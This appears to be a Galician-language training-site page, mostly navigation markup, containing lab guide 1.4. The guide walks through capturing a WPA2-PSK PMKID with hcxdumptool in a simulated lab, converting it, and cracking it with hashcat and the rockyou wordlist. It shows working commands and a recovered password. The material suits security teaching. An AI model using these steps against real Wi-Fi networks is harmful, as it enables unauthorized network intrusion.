+  <a href="#recomendacions-de-seguridade" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Recomendacións de Seguridade
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#referencias" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Referencias
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../wifite-1.4-ATAQUE_WPA2_PSK_PMKID/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    — Wifite 1.4 — WPA2 PSK PMKID
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../2.2-ATAQUE_WPA2_EAP_EVIL_TWIN/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    WPA2 EAP — Práctica 2.2 — Evil Twin
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../2.3-ATAQUE_WPA2_EAP_MITM/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    WPA2 EAP — Práctica 2.3 — MITM
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../wifite-2.1-ATAQUE_WPA2_EAP/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    — Wifite 2.1 — WPA2-Enterprise (non soportado)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../3.1-ATAQUE_WPA3_SAE/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    WPA3 SAE — Práctica 3.1
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../wifite-3.1-ATAQUE_WPA3-SAE/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    — Wifite 3.1 — Intento de recuperar contrasinal WPA3-SAE
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../3.2-ATAQUE_WPA3_KRACK/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    WPA3 SAE — Práctica 3.2 — KRACK
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../wifite-3.2-ATAQUE_WPA3_KRACK/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    — Wifite 3.2 — WPA3-SAE e KRACK (non soportado)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../3.3-ATAQUE_WPA3_DoS_WPA2_EVIL_TWIN/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    WPA3 SAE — Práctica 3.3 — Modo transición
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../wifite-3.3-ATAQUE_WPA3_DoS_WPA2_EVIL_TWIN/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    — Wifite 3.3 — WPA3-SAE: modo transición e Evil Twin (non automatizado)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Táboa de contidos">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Táboa de contidos
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#1-contexto" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        1. Contexto
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#2-preparacion-do-escenario-terminal-1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2. Preparación do Escenario (Terminal 1)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#3-reconecemento-e-modo-monitor-terminal-1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        3. Recoñecemento e Modo Monitor (Terminal 1)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#4-captura-de-pmkid-terminal-1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        4. Captura de PMKID (Terminal 1)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#5-conversion-a-formato-hashcat-terminal-1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        5. Conversión a Formato hashcat (Terminal 1)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#6-cracking-con-hashcat-terminal-1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        6. Cracking con hashcat (Terminal 1)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#7-comparacion-con-practica-11-handshake-tradicional" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        7. Comparación con Práctica 1.1 (Handshake Tradicional)
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="7. Comparación con Práctica 1.1 (Handshake Tradicional)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#practica-11-handshake-4-way" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Práctica 1.1 (Handshake 4-Way):
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#practica-14-pmkid" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Práctica 1.4 (PMKID):
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#8-observacion-tecnica" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        8. Observación Técnica
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="8. Observación Técnica">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#por-que-funciona-pmkid" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Por que funciona PMKID?
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#por-que-usamos-un-cliente-lexitimo-conectado-neste-laboratorio" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Por que usamos un cliente lexítimo conectado neste laboratorio?
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#limitacions" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Limitacións
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#vantaxe-real-sobre-practica-11" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Vantaxe Real sobre Práctica 1.1
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#9-verificacion-nos-logs-opcional" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        9. Verificación nos Logs (Opcional)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#10-limpeza" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        10. Limpeza
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#notas-finais" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Notas Finais
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Notas Finais">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#ferramentas-necesarias-xa-instaladas-en-kali" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Ferramentas Necesarias (xa instaladas en Kali)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#recomendacions-de-seguridade" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Recomendacións de Seguridade
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#referencias" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Referencias
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+<h1 id="guia-da-practica-14-captura-pmkid-en-wpa2-psk">Guía da práctica 1.4 — Captura PMKID en WPA2-PSK</h1>
+<div class="admonition note">
+<p class="admonition-title">Escenario e resultado da práctica</p>
+<p>Empregamos o escenario <code>psk</code>, cun punto de acceso WPA2-PSK e un cliente asociado. Neste laboratorio comprobouse a captura dun PMKID e a recuperación do contrasinal con Hashcat. Noutros puntos de acceso o PMKID pode non estar dispoñible: verifícao na captura, sen confundir o rexistro <code>WPA*01</code> (PMKID) con <code>WPA*02</code> (EAPOL).</p>
+</div>
+<div class="admonition important">
+<p class="admonition-title">Baseada na práctica <a href="https://raw.githubusercontent.com/ricardofc/repoEDU-CCbySA/main/HE/Taller/Wi-Fi/1-Taller-HE-Practica-WiFi-3.pdf" target="_blank">1-Taller-HE-Practica-WiFi-3.pdf</a></p>
+</div>
+<h2 id="1-contexto">1. Contexto</h2>
+<p>Nesta práctica aprenderás unha técnica moderna de auditoría WPA2-PSK que é <strong>moito menos intrusiva</strong> que o ataque de handshake tradicional. O PMKID é un identificador criptográfico que certos puntos de acceso poden incluír, por exemplo, na mensaxe EAPOL-Key M1. Cando se captura un PMKID válido, pódese comprobar a fortaleza do contrasinal sen forzar a desautenticación dun cliente lexítimo.</p>
+<p><strong>Vantaxes principais sobre <a href="../1.1-ATAQUE_WPA2_PSK/" target="_blank">Práctica 1.1</a>:</strong><br />
+- <strong>NON require deautenticación</strong> → Cliente lexítimo NON se entera do ataque<br />
+- A captura <strong>pode completarse rapidamente</strong>, se o AP proporciona o PMKID<br />
+- <strong>NON require capturar as catro mensaxes EAPOL</strong> se se obtén un PMKID válido<br />
+- <strong>Moito menos intrusivo</strong> → Cliente mantén conexión activa</p>
+<p><strong>Nota técnica sobre clientes:</strong>
+A dispoñibilidade dun PMKID depende da implementación e da configuración do AP. Nesta práctica usamos <code>psk</code>, que inclúe un cliente lexítimo (<code>wlan1</code>) conectado. Esa é a topoloxía que se validou experimentalmente; a presenza dun cliente asociado non é un requisito universal do método PMKID.</p>
+<p><strong>Diferenza clave con <a href="../1.1-ATAQUE_WPA2_PSK/" target="_blank">Práctica 1.1</a>:</strong><br />
+- Práctica 1.1: <strong>Deautenticamos</strong> ao cliente → Cliente perde conexión<br />
+- Práctica 1.4: Cliente <strong>mantén conexión</strong> → Ataque silencioso ✓</p>
+<hr />
+<h2 id="2-preparacion-do-escenario-terminal-1">2. Preparación do Escenario (Terminal 1)</h2>
+<p>Arranca o laboratorio para despregar o AP lexítimo (<code>EMPRESA-XYZ</code>) <strong>con cliente conectado</strong>.</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>sudo<span class="w"> </span>wifilabctl<span class="w"> </span>up<span class="w"> </span>psk
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>sudo<span class="w"> </span>wifilabctl<span class="w"> </span>status
+</span></code></pre></div>
+<div class="admonition warning">
+<p class="admonition-title"><strong>Nota Importante sobre PMKID</strong></p>
+<p>Aínda que o ataque PMKID <strong>non require que O ATACANTE sexa un cliente lexítimo</strong> (non necesita o contrasinal previamente), algúns APs <strong>só envían o PMKID cando hai polo menos unha asociación activa</strong> no AP. Por iso, nesta práctica:</p>
+<ul>
+<li><strong>Usamos o escenario <code>psk</code></strong> que ten un cliente lexítimo (wlan1) conectado</li>
+<li>O cliente lexítimo permite observar o comportamento do AP cunha asociación establecida</li>
+<li>O atacante (wlan2) envía Association Requests e recibe PMKID</li>
+<li><strong>NON precisamos deautenticar ao cliente</strong> (diferenza clave con Práctica 1.1)</li>
+<li><strong>NON precisamos capturar un 4-way handshake completo</strong> cando o PMKID está dispoñible</li>
+</ul>
+</div>
+<p><strong>Vantaxe sobre Práctica 1.1:</strong><br />
+- Práctica 1.1: Require <strong>deautenticación</strong> → Cliente perde conexión temporalmente<br />
+- Práctica 1.4: <strong>NON require deautenticación</strong> → Cliente NON se entera do ataque  </p>
+<hr />
+<h2 id="3-reconecemento-e-modo-monitor-terminal-1">3. Recoñecemento e Modo Monitor (Terminal 1)</h2>
+<p>Pon a túa tarxeta Wi-Fi de ataque (<code>wlan2</code>) en modo monitor.</p>
+<p><div class="language-bash highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>sudo<span class="w"> </span>airmon-ng<span class="w"> </span>start<span class="w"> </span>wlan2
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>sudo<span class="w"> </span>airodump-ng<span class="w"> </span>wlan2mon
+</span></code></pre></div>
+<em>Anota a Canle (6) do AP obxectivo (EMPRESA-XYZ).</em></p>
+<p>Preme <strong>Ctrl+C</strong> para deter airodump-ng.</p>
+<hr />
+<h2 id="4-captura-de-pmkid-terminal-1">4. Captura de PMKID (Terminal 1)</h2>
+<p>Usa <code>hcxdumptool</code> para capturar o PMKID directamente do AP.</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="c1"># Crear directorio para capturas</span>
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>mkdir<span class="w"> </span>-p<span class="w"> </span>~/capturas-pmkid
+</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a><span class="nb">cd</span><span class="w"> </span>~/capturas-pmkid
+</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a>
+</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a><span class="c1"># Capturar PMKID do AP no canal 6</span>
+</span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a>sudo<span class="w"> </span>hcxdumptool<span class="w"> </span>-i<span class="w"> </span>wlan2mon<span class="w"> </span>-w<span class="w"> </span>captura_pmkid.pcapng<span class="w"> </span>-c<span class="w"> </span>6a<span class="w"> </span>--rds<span class="o">=</span><span class="m">1</span>
+</span></code></pre></div>
+<p><strong>Parámetros importantes:</strong><br />
+- <code>-c 6a</code>: Canle 6 en modo activo, segundo a sintaxe de <code>hcxdumptool</code> empregada neste laboratorio<br />
+- <code>--rds=1</code>: Mostrar estado en tempo real  </p>
+<p><strong>Saída esperada durante a captura:</strong>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>CHA|  LAST  |EA123P|   MAC-CL   |   MAC-AP   |ESSID
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>  6|13:55:00|ep+++ |1eb9fa94c722|9e7dc6f0151f|EMPRESA-XYZ
+</span></code></pre></div></p>
+<p><strong>Significado de <code>ep+++</code>:</strong><br />
+- <code>e</code> = EAPOL capturado ✓<br />
+- <code>p</code> = PMKID capturado ✓<br />
+- <code>+++</code> = Boa calidade</p>
+<p>Cando vexas o indicador de PMKID, preme <strong>Ctrl+C</strong> para deter. O tempo de captura é variable; confirma posteriormente se se exportou un rexistro <code>WPA*01</code>.</p>
+<hr />
+<h2 id="5-conversion-a-formato-hashcat-terminal-1">5. Conversión a Formato hashcat (Terminal 1)</h2>
+<p>Converte o ficheiro capturado a formato que hashcat entende.</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="c1"># Converter captura</span>
+</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>hcxpcapngtool<span class="w"> </span>-o<span class="w"> </span>captura_pmkid.hc22000<span class="w"> </span>captura_pmkid.pcapng
+</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a>
+</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a><span class="c1"># Verificar que se xerou correctamente</span>
+</span><span id="__span-4-5"><a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a>cat<span class="w"> </span>captura_pmkid.hc22000
+</span></code></pre></div>
+<p><strong>Exemplo dunha saída EAPOL (non PMKID):</strong>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>WPA*02*60d9443cc2379bd16ff29371e8aeea87*a6c49421b094*2e2e65aef8ed*454d50524553412d58595a*209c3cccbc531952b5351c647288ac30ca493f7c3aba497c6fb5de9642955dbb*0103007502010a0000000000000000f7b8949a7f3bd65f6f7d7e081f447056fee05f3f40ff2c4f8a24af6a37861d25ad8d000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001630140100000fac040100000fac040100000fac020000*10
+</span></code></pre></div></p>
+<p><em>O exemplo anterior é <code>WPA*02</code>: material EAPOL, non un rexistro PMKID. Un PMKID exportado utiliza o prefixo <code>WPA*01</code>.</em></p>
+<p><strong>Nota:</strong> O formato <a href="../../../apuntamentos/modo-22000/" target="_blank">22000</a> de Hashcat admite rexistros <code>WPA*01</code> (PMKID) e <code>WPA*02</code> (EAPOL). Para validar especificamente esta práctica, comproba que se exportou polo menos un <code>WPA*01</code>:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>grep<span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;^WPA\*01\*&#39;</span><span class="w"> </span>captura_pmkid.hc22000
+</span></code></pre></div>
+<p>Se o resultado é <code>0</code>, podería haber material EAPOL utilizable, pero <strong>non está demostrada a captura dun PMKID</strong>.</p>
+<hr />
+<h2 id="6-cracking-con-hashcat-terminal-1">6. Cracking con hashcat (Terminal 1)</h2>
+<p>Agora imos crackear o PMKID capturado.</p>
+<p><strong>Paso 1: Preparar o dicionario</strong>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="c1"># Se Rockyou está comprimido, descomprímeo nun ficheiro temporal:</span>
+</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a><span class="k">if</span><span class="w"> </span><span class="o">[</span><span class="w"> </span>-f<span class="w"> </span>/usr/share/wordlists/rockyou.txt<span class="w"> </span><span class="o">]</span><span class="p">;</span><span class="w"> </span><span class="k">then</span>
+</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a><span class="w">    </span>cp<span class="w"> </span>/usr/share/wordlists/rockyou.txt<span class="w"> </span>/tmp/rockyou.txt
+</span><span id="__span-7-4"><a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a><span class="k">else</span>
+</span><span id="__span-7-5"><a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a><span class="w">    </span>gzip<span class="w"> </span>-dc<span class="w"> </span>/usr/share/wordlists/rockyou.txt.gz<span class="w"> </span>&gt;<span class="w"> </span>/tmp/rockyou.txt
+</span><span id="__span-7-6"><a id="__codelineno-7-6" name="__codelineno-7-6" href="#__codelineno-7-6"></a><span class="k">fi</span>
+</span></code></pre></div></p>
+<p><strong>Paso 2: Lanzar o ataque</strong>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>hashcat<span class="w"> </span>-m<span class="w"> </span><span class="m">22000</span><span class="w"> </span>captura_pmkid.hc22000<span class="w"> </span>/tmp/rockyou.txt
+</span></code></pre></div></p>
+<p>Se o ataque ten éxito, verás:
+<strong>Status: Cracked</strong></p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>60d9443cc2379bd16ff29371e8aeea87*a6c49421b094*2e2e65aef8ed*454d50524553412d58595a*...:spongebob19
+</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a>
+</span><span id="__span-9-3"><a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a>Session..........:<span class="w"> </span>hashcat
+</span><span id="__span-9-4"><a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a>Status...........:<span class="w"> </span>Cracked
+</span><span id="__span-9-5"><a id="__codelineno-9-5" name="__codelineno-9-5" href="#__codelineno-9-5"></a>Hash.Mode........:<span class="w"> </span><span class="m">22000</span><span class="w"> </span><span class="o">(</span>WPA-PBKDF2-PMKID+EAPOL<span class="o">)</span>
+</span><span id="__span-9-6"><a id="__codelineno-9-6" name="__codelineno-9-6" href="#__codelineno-9-6"></a>Time.Started.....:<span class="w"> </span>Sat<span class="w"> </span>Feb<span class="w"> </span><span class="m">14</span><span class="w"> </span><span class="m">13</span>:57:25<span class="w"> </span><span class="m">2026</span><span class="w"> </span><span class="o">(</span><span class="m">21</span><span class="w"> </span>secs<span class="o">)</span>
+</span><span id="__span-9-7"><a id="__codelineno-9-7" name="__codelineno-9-7" href="#__codelineno-9-7"></a>Speed.#01........:<span class="w">     </span><span class="m">4493</span><span class="w"> </span>H/s
+</span><span id="__span-9-8"><a id="__codelineno-9-8" name="__codelineno-9-8" href="#__codelineno-9-8"></a>Progress.........:<span class="w"> </span><span class="m">234139</span>/14344385<span class="w"> </span><span class="o">(</span><span class="m">1</span>.63%<span class="o">)</span>
+</span></code></pre></div>
+<p><strong>Paso 3: Ver o contrasinal recuperado</strong>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>hashcat<span class="w"> </span>-m<span class="w"> </span><span class="m">22000</span><span class="w"> </span>captura_pmkid.hc22000<span class="w"> </span>/tmp/rockyou.txt<span class="w"> </span>--show
+</span></code></pre></div></p>
+<p><strong>Resultado esperado:</strong>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>60d9443cc2379bd16ff29371e8aeea87*a6c49421b094*2e2e65aef8ed*454d50524553412d58595a*...:spongebob19
+</span></code></pre></div></p>
+<p><strong>Contrasinal: spongebob19</strong> ✓</p>
+<hr />
+<h2 id="7-comparacion-con-practica-11-handshake-tradicional">7. Comparación con Práctica 1.1 (Handshake Tradicional)</h2>
+<h3 id="practica-11-handshake-4-way">Práctica 1.1 (Handshake 4-Way):</h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a><span class="m">1</span>.<span class="w"> </span>airodump-ng<span class="w"> </span><span class="o">(</span>esperar<span class="w"> </span>por<span class="w"> </span>clientes<span class="o">)</span>
+</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a><span class="m">2</span>.<span class="w"> </span>aireplay-ng<span class="w"> </span><span class="o">(</span>forzar<span class="w"> </span>deautenticación<span class="o">)</span>
+</span><span id="__span-12-3"><a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a><span class="m">3</span>.<span class="w"> </span>Capturar<span class="w"> </span><span class="m">4</span><span class="w"> </span>paquetes<span class="w"> </span>EAPOL<span class="w"> </span><span class="o">(</span><span class="m">1</span>/4,<span class="w"> </span><span class="m">2</span>/4,<span class="w"> </span><span class="m">3</span>/4,<span class="w"> </span><span class="m">4</span>/4<span class="o">)</span>
+</span><span id="__span-12-4"><a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a><span class="m">4</span>.<span class="w"> </span>aircrack-ng<span class="w"> </span>ou<span class="w"> </span>hashcat
+</span><span id="__span-12-5"><a id="__codelineno-12-5" name="__codelineno-12-5" href="#__codelineno-12-5"></a>
+</span><span id="__span-12-6"><a id="__codelineno-12-6" name="__codelineno-12-6" href="#__codelineno-12-6"></a>Tempo:<span class="w"> </span>Variable<span class="w"> </span><span class="o">(</span>minutos/horas<span class="o">)</span>
+</span></code></pre></div>
+<h3 id="practica-14-pmkid">Práctica 1.4 (PMKID):</h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a><span class="m">1</span>.<span class="w"> </span>hcxdumptool<span class="w"> </span><span class="o">(</span>captura<span class="w"> </span>activa<span class="w"> </span>en<span class="w"> </span>modo<span class="w"> </span>monitor<span class="o">)</span>
+</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a><span class="m">2</span>.<span class="w"> </span><span class="m">1</span><span class="w"> </span>paquete<span class="w"> </span>EAPOL<span class="w"> </span>con<span class="w"> </span>PMKID
+</span><span id="__span-13-3"><a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a><span class="m">3</span>.<span class="w"> </span>hashcat
+</span><span id="__span-13-4"><a id="__codelineno-13-4" name="__codelineno-13-4" href="#__codelineno-13-4"></a>
+</span><span id="__span-13-5"><a id="__codelineno-13-5" name="__codelineno-13-5" href="#__codelineno-13-5"></a>Tempo:<span class="w"> </span>variable,<span class="w"> </span>segundo<span class="w"> </span>a<span class="w"> </span>resposta<span class="w"> </span><span class="k">do</span><span class="w"> </span>AP
+</span></code></pre></div>
+<p><strong>Conclusión:</strong> Cando o AP proporciona un PMKID, esta técnica permite evitar a desautenticación dun cliente lexítimo. A rapidez e a detectabilidade reais dependen do AP e das condicións da captura.</p>
+<hr />
+<h2 id="8-observacion-tecnica">8. Observación Técnica</h2>
+<h3 id="por-que-funciona-pmkid">Por que funciona PMKID?</h3>
+<p>O PMKID é un hash que o AP envía no primeiro paquete EAPOL:
+<div class="language-text highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>PMKID = HMAC-SHA1-128(PMK, &quot;PMK Name&quot; || MAC_AP || MAC_STA)
+</span></code></pre></div></p>
+<p>Como deriva do <strong>PMK</strong> (Pairwise Master Key), igual que o handshake tradicional, permite auditar o contrasinal da mesma forma.</p>
+<h3 id="por-que-usamos-un-cliente-lexitimo-conectado-neste-laboratorio">Por que usamos un cliente lexítimo conectado neste laboratorio?</h3>
+<p><strong>Explicación técnica:</strong><br />
+1. En WPA2-PSK, a <strong>PMK</strong> deriva da PSK e do SSID.<br />
+2. O PMKID identifícase a partir da PMK e dos enderezos MAC implicados no intercambio.<br />
+3. A inclusión dun PMKID no intercambio depende da configuración e da implementación; <strong>non é universalmente necesario</strong> que outro cliente completase previamente un handshake.<br />
+4. Neste laboratorio <code>wlan1</code> está conectado porque forma parte do escenario <code>psk</code> probado.</p>
+<p><strong>Secuencia:</strong>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>1. wlan1 (cliente) → Autentica con contrasinal → 4-way handshake completo
+</span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a>2. AP e cliente derivan o material criptográfico da PSK e do SSID
+</span><span id="__span-15-3"><a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a>3. wlan2 (auditor) → Inicia o intercambio necesario para a captura
